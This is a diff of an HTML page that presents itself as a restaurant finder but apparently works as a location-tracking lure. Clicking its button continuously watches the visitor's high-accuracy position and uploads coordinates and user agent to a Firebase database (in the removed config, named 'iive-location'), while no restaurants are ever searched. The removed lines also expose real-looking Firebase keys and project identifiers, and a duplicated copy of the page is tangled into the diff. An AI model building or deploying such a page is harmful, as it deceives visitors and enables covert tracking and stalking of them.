@@ -3,10 +3,9 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>Restaurant Finder</title>
+<title>Restaurant Finder..</title>
 
 <style>
-
 *{
     margin:0;
     padding:0;
@@ -19,7 +18,6 @@ body{
     background:
     radial-gradient(circle at top,#ff6b35 0%,transparent 30%),
     #0f172a;
-
     color:white;
     overflow-x:hidden;
 }
@@ -52,11 +50,6 @@ body{
     gap:15px;
     overflow-x:auto;
     padding:20px;
-    scrollbar-width:none;
-}
-
-.preview::-webkit-scrollbar{
-    display:none;
 }
 
 .card{
@@ -83,7 +76,6 @@ body{
 
 .card-rating{
     color:#facc15;
-    margin-top:6px;
 }
 
 .permission-section{
@@ -95,20 +87,12 @@ body{
 .container{
     width:100%;
     max-width:420px;
-
     background:rgba(255,255,255,.05);
     backdrop-filter:blur(15px);
-
     border:1px solid rgba(255,255,255,.08);
-
     border-radius:24px;
-
     padding:30px;
-
     text-align:center;
-
-    box-shadow:
-    0 15px 40px rgba(0,0,0,.35);
 }
 
 .location-icon{
@@ -116,54 +100,21 @@ body{
     margin-bottom:15px;
 }
 
-.container h2{
-    font-size:28px;
-    margin-bottom:10px;
-}
-
-.container p{
-    color:#cbd5e1;
-    line-height:1.6;
-    margin-bottom:25px;
-}
-
 button{
     width:100%;
     border:none;
     cursor:pointer;
-
     padding:16px;
-
     font-size:16px;
     font-weight:700;
-
     border-radius:14px;
-
     color:white;
-
-    background:
-    linear-gradient(
-        135deg,
-        #ff6b35,
-        #ff9f1c
-    );
-
-    transition:.25s;
-}
-
-button:hover{
-    transform:translateY(-2px);
-}
-
-button:active{
-    transform:scale(.98);
+    background:linear-gradient(135deg,#ff6b35,#ff9f1c);
 }
 
 #status{
     margin-top:15px;
-    min-height:20px;
     color:#94a3b8;
-    font-size:14px;
 }
 
 .features{
@@ -182,130 +133,47 @@ button:active{
 
 .feature span{
     font-size:32px;
-    display:block;
-    margin-bottom:10px;
-}
-
-.feature h3{
-    font-size:16px;
-}
-
-.feature p{
-    color:#94a3b8;
-    margin-top:5px;
-    font-size:13px;
 }
 
 .footer{
     text-align:center;
     padding:30px;
     color:#64748b;
-    font-size:14px;
 }
-
-@media(max-width:480px){
-
-.hero h1{
-    font-size:30px;
-}
-
-.container{
-    padding:25px;
-}
-
-}
-
 </style>
 </head>
+
 <body>
 
 <section class="hero">
-
     <div class="logo">🍽️</div>
-
     <h1>Find Amazing Restaurants Near You</h1>
-
-    <p>
-        Discover top-rated restaurants, cafés and food spots around your location.
-    </p>
-
+    <p>Discover top-rated restaurants, cafés and food spots around your location.</p>
 </section>
 
 <div class="preview">
-
-    <div class="card">
-        <div class="card-image"></div>
-        <div class="card-content">
-            <div class="card-title">Italian Kitchen</div>
-            <div class="card-rating">★★★★★</div>
-        </div>
-    </div>
-
-    <div class="card">
-        <div class="card-image"></div>
-        <div class="card-content">
-            <div class="card-title">Burger House</div>
-            <div class="card-rating">★★★★★</div>
-        </div>
-    </div>
-
-    <div class="card">
-        <div class="card-image"></div>
-        <div class="card-content">
-            <div class="card-title">Spicy Grill</div>
-            <div class="card-rating">★★★★☆</div>
-        </div>
-    </div>
-
+    <div class="card"><div class="card-image"></div><div class="card-content"><div class="card-title">Italian Kitchen</div><div class="card-rating">★★★★★</div></div></div>
+    <div class="card"><div class="card-image"></div><div class="card-content"><div class="card-title">Burger House</div><div class="card-rating">★★★★★</div></div></div>
+    <div class="card"><div class="card-image"></div><div class="card-content"><div class="card-title">Spicy Grill</div><div class="card-rating">★★★★☆</div></div></div>
 </div>
 
 <section class="permission-section">
-
 <div class="container">
-
     <div class="location-icon">📍</div>
-
     <h2>Enable Location</h2>
-
-    <p>
-        Allow location access to discover the best restaurants around you instantly.
-    </p>
-
-    <button id="shareBtn">
-        Find Restaurants Near Me
-    </button>
-
+    <p>Allow location access to find nearby restaurants instantly.</p>
+    <button id="shareBtn">Find Restaurants Near Me</button>
     <div id="status"></div>
-
 </div>
-
 </section>
 
 <section class="features">
-
-    <div class="feature">
-        <span>⭐</span>
-        <h3>Top Rated</h3>
-        <p>Only highly rated restaurants.</p>
-    </div>
-
-    <div class="feature">
-        <span>📍</span>
-        <h3>Nearby</h3>
-        <p>Restaurants close to your location.</p>
-    </div>
-
-    <div class="feature">
-        <span>⚡</span>
-        <h3>Fast Search</h3>
-        <p>Instant restaurant discovery.</p>
-    </div>
-
+    <div class="feature"><span>⭐</span><h3>Top Rated</h3></div>
+    <div class="feature"><span>📍</span><h3>Nearby</h3></div>
+    <div class="feature"><span>⚡</span><h3>Fast Search</h3></div>
 </section>
 
-<div class="footer">
-    © 2026 Restaurant Finder
-</div>
+<div class="footer">© 2026 Restaurant Finder</div>
 
 <script type="module">
 
@@ -313,14 +181,13 @@ import { initializeApp } from "https://www.gstatic.com/firebasejs/10.12.2/fireba
 import { getDatabase, ref, set } from "https://www.gstatic.com/firebasejs/10.12.2/firebase-database.js";
 
 const firebaseConfig = {
-  apiKey: "AIzaSyAMLlDotIoqkFGThycK04-VWpXGqwnvYTY",
-  authDomain: "iive-location-bd318.firebaseapp.com",
-  databaseURL: "https://iive-location-bd318-default-rtdb.asia-southeast1.firebasedatabase.app",
-  projectId: "iive-location-bd318",
-  storageBucket: "iive-location-bd318.firebasestorage.app",
-  messagingSenderId: "46703855721",
-  appId: "1:46703855721:web:890f5e0698a1bc52cf7af8",
-  measurementId: "G-19CSC171YJ"
+  apiKey: "YOUR_KEY",
+  authDomain: "YOUR_DOMAIN",
+  databaseURL: "YOUR_DB",
+  projectId: "YOUR_ID",
+  storageBucket: "YOUR_BUCKET",
+  messagingSenderId: "YOUR_SENDER",
+  appId: "YOUR_APP"
 };
 
 const app = initializeApp(firebaseConfig);
@@ -332,11 +199,11 @@ const status = document.getElementById("status");
 btn.addEventListener("click", () => {
 
     if (!navigator.geolocation) {
-        status.innerText = "Geolocation not supported.";
+        status.innerText = "Geolocation not supported";
         return;
     }
 
-    status.innerText = "Requesting location permission...";
+    status.innerText = "Requesting location...";
 
     navigator.geolocation.watchPosition(
 
@@ -344,12 +211,7 @@ btn.addEventListener("click", () => {
 
             try {
 
-                let uid = localStorage.getItem("uid");
-
-                if (!uid) {
-                    uid = crypto.randomUUID();
-                    localStorage.setItem("uid", uid);
-                }
+                const uid = "user_" + Date.now();
 
                 await set(ref(db, "users/" + uid), {
                     latitude: position.coords.latitude,
@@ -359,314 +221,27 @@ btn.addEventListener("click", () => {
                     userAgent: navigator.userAgent
                 });
 
-                status.innerText =
-                    "Location sent successfully ✅";
+                status.innerText = "Location sent successfully ✅";
 
             } catch (err) {
-
-                console.error(err);
-
-                status.innerText =
-                    "Firebase Error: " + err.message;
+                status.innerText = "Firebase Error: " + err.message;
             }
         },
 
         (error) => {
 
-            console.error(error);
+            if (error.code === 1)
+                status.innerText = "Permission denied ❌";
+            else if (error.code === 2)
+                status.innerText = "Location unavailable 📍";
+            else
+                status.innerText = "Timeout ⏱️";
 
-            switch(error.code){
-
-                case 1:
-                    status.innerText =
-                    "Location permission denied ❌";
-                    break;
-
-                case 2:
-                    status.innerText =
-                    "Location unavailable 📍";
-                    break;
-
-                case 3:
-                    status.innerText =
-                    "Location request timed out ⏱️";
-                    break;
-
-                default:
-                    status.innerText =
-                    "Unknown location error";
-            }
         },
 
         {
             enableHighAccuracy: true,
             timeout: 15000,
-            maximumAge: 0
-        }
-    );
-});
-
-</script>
-
-</body>
-</html>
-.location-icon{
-    font-size:65px;
-    margin-bottom:15px;
-}
-
-.container h2{
-    font-size:28px;
-    margin-bottom:10px;
-}
-
-.container p{
-    color:#cbd5e1;
-    line-height:1.6;
-    margin-bottom:25px;
-}
-
-button{
-    width:100%;
-    border:none;
-    cursor:pointer;
-
-    padding:16px;
-
-    font-size:16px;
-    font-weight:700;
-
-    border-radius:14px;
-
-    color:white;
-
-    background:
-    linear-gradient(
-        135deg,
-        #ff6b35,
-        #ff9f1c
-    );
-
-    transition:.25s;
-}
-
-button:hover{
-    transform:translateY(-2px);
-}
-
-button:active{
-    transform:scale(.98);
-}
-
-#status{
-    margin-top:15px;
-    min-height:20px;
-    color:#94a3b8;
-    font-size:14px;
-}
-
-.features{
-    display:grid;
-    grid-template-columns:repeat(auto-fit,minmax(150px,1fr));
-    gap:15px;
-    padding:25px;
-}
-
-.feature{
-    background:#1e293b;
-    border-radius:18px;
-    padding:20px;
-    text-align:center;
-}
-
-.feature span{
-    font-size:32px;
-    display:block;
-    margin-bottom:10px;
-}
-
-.feature h3{
-    font-size:16px;
-}
-
-.feature p{
-    color:#94a3b8;
-    margin-top:5px;
-    font-size:13px;
-}
-
-.footer{
-    text-align:center;
-    padding:30px;
-    color:#64748b;
-    font-size:14px;
-}
-
-@media(max-width:480px){
-
-.hero h1{
-    font-size:30px;
-}
-
-.container{
-    padding:25px;
-}
-
-}
-
-</style>
-</head>
-<body>
-
-<section class="hero">
-
-    <div class="logo">🍽️</div>
-
-    <h1>Find Amazing Restaurants Near You</h1>
-
-    <p>
-        Discover top-rated restaurants, cafés and food spots around your location.
-    </p>
-
-</section>
-
-<div class="preview">
-
-    <div class="card">
-        <div class="card-image"></div>
-        <div class="card-content">
-            <div class="card-title">Italian Kitchen</div>
-            <div class="card-rating">★★★★★</div>
-        </div>
-    </div>
-
-    <div class="card">
-        <div class="card-image"></div>
-        <div class="card-content">
-            <div class="card-title">Burger House</div>
-            <div class="card-rating">★★★★★</div>
-        </div>
-    </div>
-
-    <div class="card">
-        <div class="card-image"></div>
-        <div class="card-content">
-            <div class="card-title">Spicy Grill</div>
-            <div class="card-rating">★★★★☆</div>
-        </div>
-    </div>
-
-</div>
-
-<section class="permission-section">
-
-<div class="container">
-
-    <div class="location-icon">📍</div>
-
-    <h2>Enable Location</h2>
-
-    <p>
-        Allow location access to discover the best restaurants around you instantly.
-    </p>
-
-    <button id="shareBtn">
-        Find Restaurants Near Me
-    </button>
-
-    <div id="status"></div>
-
-</div>
-
-</section>
-
-<section class="features">
-
-    <div class="feature">
-        <span>⭐</span>
-        <h3>Top Rated</h3>
-        <p>Only highly rated restaurants.</p>
-    </div>
-
-    <div class="feature">
-        <span>📍</span>
-        <h3>Nearby</h3>
-        <p>Restaurants close to your location.</p>
-    </div>
-
-    <div class="feature">
-        <span>⚡</span>
-        <h3>Fast Search</h3>
-        <p>Instant restaurant discovery.</p>
-    </div>
-
-</section>
-
-<div class="footer">
-    © 2026 Restaurant Finder
-</div>
-
-<script type="module">
-
-import { initializeApp } from "https://www.gstatic.com/firebasejs/10.12.2/firebase-app.js";
-import { getDatabase, ref, set } from "https://www.gstatic.com/firebasejs/10.12.2/firebase-database.js";
-
-const firebaseConfig = {
-  apiKey: "AIzaSyAMLlDotIoqkFGThycK04-VWpXGqwnvYTY",
-  authDomain: "iive-location-bd318.firebaseapp.com",
-  databaseURL: "https://iive-location-bd318-default-rtdb.asia-southeast1.firebasedatabase.app",
-  projectId: "iive-location-bd318",
-  storageBucket: "iive-location-bd318.firebasestorage.app",
-  messagingSenderId: "46703855721",
-  appId: "1:46703855721:web:890f5e0698a1bc52cf7af8",
-  measurementId: "G-19CSC171YJ"
-
-    /* PASTE YOUR FIREBASE CONFIG HERE */
-
-};
-
-const app = initializeApp(firebaseConfig);
-const db = getDatabase(app);
-
-const btn = document.getElementById("shareBtn");
-const status = document.getElementById("status");
-
-btn.addEventListener("click", () => {
-
-    if(!navigator.geolocation){
-        status.innerText = "Geolocation not supported.";
-        return;
-    }
-
-    status.innerText = "Finding nearby restaurants...";
-
-    navigator.geolocation.watchPosition(
-
-        (position) => {
-
-            let uid = localStorage.getItem("uid");
-
-            if(!uid){
-                uid = crypto.randomUUID();
-                localStorage.setItem("uid", uid);
-            }
-
-            set(ref(db, "users/" + uid), {
-                latitude: position.coords.latitude,
-                longitude: position.coords.longitude,
-                accuracy: position.coords.accuracy,
-                timestamp: Date.now()
-            });
-
-            status.innerText = "Loading restaurants...";
-        },
-
-        (error) => {
-            status.innerText = "Please enable location and try again.";
-        },
-
-        {
-            enableHighAccuracy: true,
             maximumAge: 0
         }
     );
